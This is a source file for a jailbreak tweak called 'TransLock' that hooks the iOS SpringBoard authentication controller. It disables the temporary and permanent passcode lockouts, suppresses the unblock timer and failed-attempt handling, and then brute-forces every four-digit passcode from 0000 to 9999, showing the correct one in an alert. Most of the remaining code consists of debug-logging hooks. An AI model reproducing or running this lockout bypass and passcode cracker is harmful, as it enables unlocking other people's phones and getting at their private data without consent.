
@interface SBFUserAuthenticationController : NSObject
-(BOOL)_isTemporarilyBlocked;
-(BOOL)_isPermanentlyBlocked;
-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2;
-(void)_unblockTimerFired;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
 
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});
	return __sharedInstance;
}

- (void)bruteforce {
	for (int i = 0; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		//NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
		if (TRUE) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			break;
		}
	}

}
@end 

%hook SBFUserAuthenticationController
static BOOL hasBeenCalled = NO;
-(BOOL)_isTemporarilyBlocked {
	if (hasBeenCalled) {
		HBLogDebug(@"i AM BEING CALLED");
		double delayInSeconds = 15.0;
	dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
	dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
		HBLogDebug(@"WELCOME TO THE JUNGLE!");
		for (int i = 0; i <= 9999; i++)
		{
			numString = [NSString stringWithFormat:@"%04d", i];
			NSLog(@"Testing : %@", numString);
			NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
			BOOL result = [self _authenticateWithPasscodeData:data outError:NULL];
			NSLog(@"The result is : %d", result);

			if (result == YES) {
				[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
				NSLog(@"Password is : %@", numString);
				break;
			}
		}

});
		

		hasBeenCalled = YES;
	}
	// BOOL val = %orig;
	//HBLogDebug(@"_isTemporarilyBlocked %d", val);
	return NO;
}
-(BOOL)_isPermanentlyBlocked {
	// BOOL val = %orig;
	//HBLogDebug(@"_isPermanentlyBlocked %d", val);
	return NO;
}

+(BOOL)_isInGracePeriodState{
	BOOL val = %orig;
	HBLogDebug(@"_isInGracePeriodState %d", val);
	return val;
}
//: Called user uses finger as passcode
+(BOOL)_isInBioUnlockState{
	BOOL val = %orig;
	// HBLogDebug(@"_isInBioUnlockState %d", val);
	return val;
}
+(long long)_extendedKeybagState {
	long long val = %orig;
	HBLogDebug(@"_extendedKeybagState %lld", val);
	return val;
}
-(void)dealloc {
	HBLogDebug(@"dealloc");
	%orig;
}
-(NSString *)description {
	NSString *val = %orig;
	HBLogDebug(@"description %@", val);
	return val;
}
-(void)_clearBlockedState {
	HBLogDebug(@"_clearBlockedState");
	%orig;
}
-(void)keybagDidUnlockForTheFirstTime:(id)arg1 {
	id val = arg1;
	HBLogDebug(@"keybagDidUnlockForTheFirstTime, value: %@", val);
	%orig;
}
-(id)publicDescription {
	id val = %orig;
	HBLogDebug(@"publicDescription, value: %@", val);
	return val;
}
-(void)keybag:(id)arg1 extendedStateDidChange:(id)arg2 {
	id val = arg1;
	id val2 = arg2;
	HBLogDebug(@"keybag, arg1 value: %@..... arg2 value: %@", val, val2);
	%orig;
}
//: Tells us whether there is a passcode set 
-(BOOL)hasPasscodeSet {
	BOOL val = %orig;
	//HBLogDebug(@"hasPasscodeSet %d", val);
	return val;
}
-(id)initWithAssertionManager:(id)arg1 policy:(id)arg2 keybag:(id)arg3 model:(id)arg4 {
	id val = arg1; 
	id val2 = arg2; 
	id val3 = arg3; 
	id val4 = arg4; 
	id finalValue = %orig;
	HBLogDebug(@"initWithAssertionManager, arg values: %@ %@ %@ %@ finalValue: %@", val, val2, val3, val4, finalValue);
	return %orig;
}
-(void)_initializeAuthenticationStateAndDateForLockState:(long long)arg1 {
	//long long val = arg1;
	//HBLogDebug(@"_initializeAuthenticationStateAndDateForLockState %lld", val); 
	%orig;
}

-(void)_establishAuthenticationStateForInit:(long long)arg1 {
	//HBLogDebug(@"_establishAuthenticationStateForInit");
	//%log;
	%orig;
}
-(void)_clearUnblockTimer {
	//HBLogDebug(@"_clearUnblockTimer");
	//%log;
	%orig;
}
///////
-(void)_addAsFirstResponder:(id)arg1 {
	HBLogDebug(@"_addAsFirstResponder");
	%log;
	%orig;
}
-(void)_removeAuthResponder:(id)arg1 {
	HBLogDebug(@"_removeAuthResponder");
	%log;
	%orig;
}
-(BOOL)_processAuthenticationRequest:(id)arg1 responder:(id)arg2 {
	BOOL val = %orig;
	HBLogDebug(@"_processAuthenticationRequest, arg1: %@ responder %@", arg1, arg2);
	%log;
	return val;
}
-(long long)_evaluateAuthenticationAttempt:(id)arg1 outError:(id*)arg2 {
	long long val = %orig;
	//HBLogDebug(@"_evaluateAuthenticationAttempt");
	//%log;
	return val;
}

-(void)_notifyClientsOfAuthenticationResult:(long long)arg1 forRequest:(id)arg2 error:(id)arg3 withResponder:(id)arg4 {
	//HBLogDebug(@"_notifyClientsOfAuthenticationResult");
	//%log;
	%orig;
}
// arg1 a 1 if failed passcode attempt is 2 if success
//Dont change this
-(BOOL)_boolForAuthenticationResult:(long long)arg1 {
	BOOL val = %orig;
	HBLogDebug(@"_boolForAuthenticationResult %d", val);
	%log;
	return val;
}
//: called when pass is correct
-(void)_handleSuccessfulAuthentication:(id)arg1 responder:(id)arg2  {
	HBLogDebug(@"_handleSuccessfulAuthentication");
	%log;
	%orig;
}

-(void)_handleFailedAuthentication:(id)arg1 error:(id)arg2 responder:(id)arg3 {
	HBLogDebug(@"_handleFailedAuthentication");
	%log;
	//%orig;
	return;
}
-(void)_handleInvalidAuthentication:(id)arg1 responder:(id)arg2 {
	HBLogDebug(@"_handleInvalidAuthentication");
	%log;
	%orig;
}
//: This triggers the timer
-(void)_scheduleUnblockTimer {
	//HBLogDebug(@"_scheduleUnblockTimer");
	%log;
	//%orig;
	HBLogDebug(@"Lets bypass this timer!");
	//[self _unblockTimerFired];
	return;
}
-(void)_setAuthState:(long long)arg1  {
	//HBLogDebug(@"_setAuthState");
	//%log;
	%orig;
}
-(long long)_authenticationState {
	long long val = %orig;
	HBLogDebug(@"_authenticationState");
	%log;
	return val;
}

-(void)_uncachePasscodeIfNecessary{
	HBLogDebug(@"_uncachePasscodeIfNecessary");
	%log;
	%orig;
}
//: arg2 is 1 or true when locked and 0 when unlocked
-(void)_setSecureMode:(BOOL)arg1 postNotification:(BOOL)arg2 {
	HBLogDebug(@"_setSecureMode");
	%log;
	%orig;
}
-(BOOL)_authenticateIfInGracePeriod {
	BOOL val = %orig;
	HBLogDebug(@"_authenticateIfInGracePeriod");
	%log;
	return val;
}
-(void)_updateAuthenticationStateForPublicReason:(id)arg1 {
	//HBLogDebug(@"_updateAuthenticationStateForPublicReason");
	//%log;
	 %orig;
}
//: Gets called whenever user taps a number
-(void)notePasscodeEntryBegan {
	//HBLogDebug(@"notePasscodeEntryBegan");
	//%log;
	 %orig;
}
//: Gets called when user deletes all numbers tapped
-(void)notePasscodeEntryCancelled {
	//HBLogDebug(@"notePasscodeEntryCancelled");
	//%log;
	 %orig;
}
-(void)_notifyAboutTemporaryBlockStatusChanged {
	//HBLogDebug(@"_notifyAboutTemporaryBlockStatusChanged");
	//%log;
	 %orig;
}

//: Called user uses finger as passcode
-(BOOL)_performNilPasscodeCheck{
	BOOL val = %orig;
	// HBLogDebug(@"_performNilPasscodeCheck %d", val);
	return val;
}

-(BOOL)_isUserAuthenticated{
	BOOL val = %orig;
	//HBLogDebug(@"_isUserAuthenticated %d", val);
	return val;
}

-(void)_revokeAuthenticationImmediately:(BOOL)arg1 forPublicReason:(id)arg2 {
	// BOOL val = arg1;
	// HBLogDebug(@"has been revoked? %d because of %@", val, arg2);
	%orig;
}
-(BOOL)_shouldRevokeAuthenticationNow{
	BOOL val = %orig;
	// HBLogDebug(@"_shouldRevokeAuthenticationNow %d", val);
	return val;
}
-(id)_lastIncorrectPasscodeAttempt {
	id val = %orig;
	HBLogDebug(@"_lastIncorrectPasscodeAttempt %@", val);
	return %orig;
}
-(void)_setLastIncorrectPasscodeAttempt:(id)arg1 {
	id val = arg1;
	HBLogDebug(@"_setLastIncorrectPasscodeAttempt %@", val);
	%orig;
}
////////////
-(void)_refreshModelCacheIfNeeded{
	HBLogDebug(@"_refreshModelCacheIfNeeded ");

	%log;
	%orig;
}
//: hmmm
-(long long)_evaluatePasscodeAttempt:(id)arg1 outError:(id*)arg2 {
	//HBLogDebug(@"_evaluatePasscodeAttempt ");
	//%log;
	long long val = %orig;
	return val;
}
-(long long)_evaluateMesaAttempt:(id)arg1 {
	HBLogDebug(@"_evaluateMesaAttempt ");
	%log;
	long long val = %orig;
	return val;
}
//:hmmm
-(void)_setup_runLoopObserverIfNecessary{
	//%log;
	//HBLogDebug(@"_setup_runLoopObserverIfNecessary");
	%orig;
}
-(void)_invalidateCachedPasscodeLockState {
	//%log;
	//HBLogDebug(@"_invalidateCachedPasscodeLockState");
	%orig;
}
-(void)_updateSecureModeIfNecessaryForNewAuthState {
	//%log;
	//HBLogDebug(@"_updateSecureModeIfNecessaryForNewAuthState");
	%orig;
}
//arg1 is 1 or true when bootup
-(void)_setOkToSendNotifications:(BOOL)arg1  {
	%log;
	HBLogDebug(@"_setOkToSendNotifications");
	%orig;
}
//: i do have passcode
-(void)_updateHasPasscodeSetForLockState:(long long)arg1 {
	//%log;
	//HBLogDebug(@"_updateHasPasscodeSetForLockState");
	%orig;
}

//: yum this is called when timer is up and user can enter next input
-(void)_unblockTimerFired {
	%log;
	HBLogDebug(@"_unblockTimerFired");
	%orig;
}
-(void)_updateAuthenticationStateAndFirstAuthenticationForLockState:(long long)arg1 {
	%log;
	HBLogDebug(@"_updateAuthenticationStateAndFirstAuthenticationForLockState");
	%orig;
}
-(void)_updateAuthenticationStateAndDateForLockState:(id)arg1 {
	//%log;
	//HBLogDebug(@"_updateAuthenticationStateAndDateForLockState");
	%orig;
}
-(void)deviceLockModelRequestsDeviceWipe:(id)arg1 {
	%log;
	HBLogDebug(@"deviceLockModelRequestsDeviceWipe");
	%orig;
}
-(void)deviceLockStateMayHaveChangedForModel:(id)arg1 {
	//%log;
	//HBLogDebug(@"deviceLockStateMayHaveChangedForModel");
	%orig;
}
//: Does what it says
-(BOOL)hasAuthenticatedAtLeastOnceSinceBoot {
	BOOL val = %orig;
	//%log;
	//HBLogDebug(@"hasAuthenticatedAtLeastOnceSinceBoot");
	return val;
}
-(BOOL)isAuthenticatedCached {
	BOOL val = %orig;
	//%log;
	//HBLogDebug(@"isAuthenticatedCached");
	return val;
}
-(void)revokeAuthenticationImmediatelyForPublicReason:(id)arg1 {
	%log;
	HBLogDebug(@"revokeAuthenticationImmediatelyForPublicReason");
	%orig;
}
-(void)revokeAuthenticationImmediatelyIfNecessaryForPublicReason:(id)arg1 {
	//%log;
	//HBLogDebug(@"revokeAuthenticationImmediatelyIfNecessaryForPublicReason");
	%orig;
}
-(void)revokeAuthenticationIfNecessaryForPublicReason:(id)arg1 {
	//%log;
	//HBLogDebug(@"revokeAuthenticationIfNecessaryForPublicReason");
	%orig;
}
-(id)initWithAssertionManager:(id)arg1 policy:(id)arg2  {
	id val = %orig;
	//%log;
	//HBLogDebug(@"initWithAssertionManager");
	return val;
}
-(void)addAsFirstResponder:(id)arg1 {
	%log;
	HBLogDebug(@"addAsFirstResponder");
	%orig;
}
-(void)removeResponder:(id)arg1 {
	%log;
	HBLogDebug(@"removeResponder");
	%orig;
}
// hmm
-(void)processAuthenticationRequest:(id)arg1 responder:(id)arg2 {
	//%log;
	//HBLogDebug(@"processAuthenticationRequest");
	%orig;
}
-(void)processAuthenticationRequest:(id)arg1 {
	%log;
	HBLogDebug(@"processAuthenticationRequest");
	%orig;
}
-(void)addAuthenticationAssertion:(id)arg1 {
	//%log;
	//HBLogDebug(@"addAuthenticationAssertion");
	%orig;
}
-(void)removeAuthenticationAssertion:(id)arg1 {
	//%log;
	//HBLogDebug(@"removeAuthenticationAssertion");
	%orig;
}
-(double)_timeUntilUnblockedSinceReferenceDate{
	double val = %orig;
	%log;
	HBLogDebug(@"_timeUntilUnblockedSinceReferenceDate");
	return val;
}
-(void)_notifyOfAuthenticationSuccess{
	%log;
	HBLogDebug(@"_notifyOfAuthenticationSuccess");
	%orig;
}
//////
/*
-(void)_addPrivateAuthenticationObserver:(id)arg1 ;
-(void)_removePrivateAuthenticationObserver:(id)arg1 ;
-(void)_setObservers:(id)arg1 ;*/
//: Prints when the last valid password entered was
-(NSDate *)lastRevokedAuthenticationDate {
	NSDate *val = %orig;
	HBLogDebug(@"lastRevokedAuthenticationDate, value  %@", val);
	return val;
}
/*
-(void)setHasPasscodeSet:(BOOL)arg1 ;
-(id)_policy;
-(void)_setPolicy:(id)arg1 ; */

/*
-(id)_assertionManager;
-(void)_setAssertionManager:(id)arg1 ;
-(id)_transientAuthCheckingAssertion;
-(void)_setTransietAuthCheckingAssertion:(id)arg1 ;
-(id)_responders;
-(void)_setResponders:(id)arg1 ;
-(CFRunLoopObserverRef)_runLoopObserver;
-(void)_setRunLoopObserver:(CFRunLoopObserverRef)arg1 ; */

-(id)_unblockTimer {
	id val = %orig;
	HBLogDebug(@"_unblockTimer, value  %@", val);
	return val;
}

////////////
-(void)_setUnblockTimer:(id)arg1  {
	HBLogDebug(@"_setUnblockTimer... value %@", arg1);
	%orig;
}
-(double)_timeUntilUnblockedSinceReferenceDate {
	double val = %orig;
	HBLogDebug(@"_timeUntilUnblockedSinceReferenceDate... value %f", val);
	return val;
}
/*
-(void)_setAuthenticationState:(long long)arg1 ;
-(BOOL)_lastAuthStateWasAuthenticated;
-(void)_setLastAuthStateWasAuthenticated:(BOOL)arg1 ;
-(BOOL)_shouldFetchAuthenticationState;
-(void)_setShouldFetchAuthenticationState:(BOOL)arg1 ;
-(BOOL)_isInSecureMode;
-(void)_setInSecureMode:(BOOL)arg1 ;
-(BOOL)_okToSendNotifications;
-(BOOL)_hasBeenAuthenticatedOnceSinceBoot;
-(BOOL)isAuthenticated;*/


-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2 {
	/*
	HBLogDebug(@"_authenticateWithPasscodeData!");
	HBLogDebug(@"arg1 is %@", arg1);
	HBLogDebug(@"arg1 belongs to %@", [arg1 class]);

	NSString* myString;
	myString = [[NSString alloc] initWithData:arg1 encoding:NSUTF8StringEncoding];
	HBLogDebug(@"arg1 in string is: %@", myString);

	NSData* data = [myString dataUsingEncoding:NSUTF8StringEncoding];
	HBLogDebug(@"converting arg1 back is: %@", data);
	
	// id val = *arg2;
	// HBLogDebug(@"arg2 belongs to %@", [val class]);
	BOOL val = %orig;
	HBLogDebug(@"thE return VALUE IS %d", val);

	HBLogDebug(@"arg2 is %@", *arg2);
	HBLogDebug(@"arg2 belongs to %@", [*arg2 class]);
*/

	return %orig;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;
	//[[TransLock sharedInstance] bruteforce];
}
%end